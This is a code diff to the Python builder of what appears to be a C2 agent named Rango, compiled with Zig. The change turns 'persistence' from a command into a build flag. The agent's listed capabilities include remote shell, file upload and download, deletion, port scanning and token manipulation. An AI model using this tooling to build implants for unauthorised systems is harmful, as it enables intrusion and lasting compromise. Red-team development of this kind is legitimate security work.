@@ -60,6 +60,13 @@ class Rango(PayloadType):
             default_value="x86_64",
         ),
         BuildParameter(
+            name="persistence",
+            parameter_type=BuildParameterType.Boolean,
+            description="Compile with persistence enabled",
+            default_value=False,
+            required=False,
+        ),
+        BuildParameter(
             name="Packing_key",
             parameter_type=BuildParameterType.String,
             description="Key to use for ZYRA packing (if enabled)",
@@ -197,12 +204,12 @@ pub const agentConfig: types.AgentConfig = .{{
         ))
 
         release_type = self.get_parameter("release_type")
+        persistence = self.get_parameter("persistence")
 
         # Commands that map 1:1 to -D build flags in build.zig
         flaggable_commands = {
             "shell", "pwd", "ls", "cat", "download",
-            "upload", "deletefile", "deletedirectory", "portscan", "maketoken",
-            "persistence"
+            "upload", "deletefile", "deletedirectory", "portscan", "maketoken"
         }
         selected_commands = self.commands.get_commands()
         if "maketoken" in selected_commands and "rev2self" not in selected_commands:
@@ -212,6 +219,9 @@ pub const agentConfig: types.AgentConfig = .{{
             for cmd in selected_commands
             if cmd in flaggable_commands
         )
+
+        if persistence:
+            zig_flags += " -Dpersistence=true"
 
         if release_type == "debug":
             command = f"zig build -Dtarget={zig_target} {zig_flags}"
@@ -295,8 +305,7 @@ pub const agentConfig: types.AgentConfig = .{{
         try:
             all_rango_commands = [
                 "cat", "deletedirectory", "deletefile", "download",
-                "exit", "ls", "portscan", "pwd", "shell", "upload", "maketoken",
-                "persistence"
+                "exit", "ls", "portscan", "pwd", "shell", "upload", "maketoken"
             ]
             unselected_commands = [cmd for cmd in all_rango_commands if cmd not in selected_commands]
             for cmd in unselected_commands:
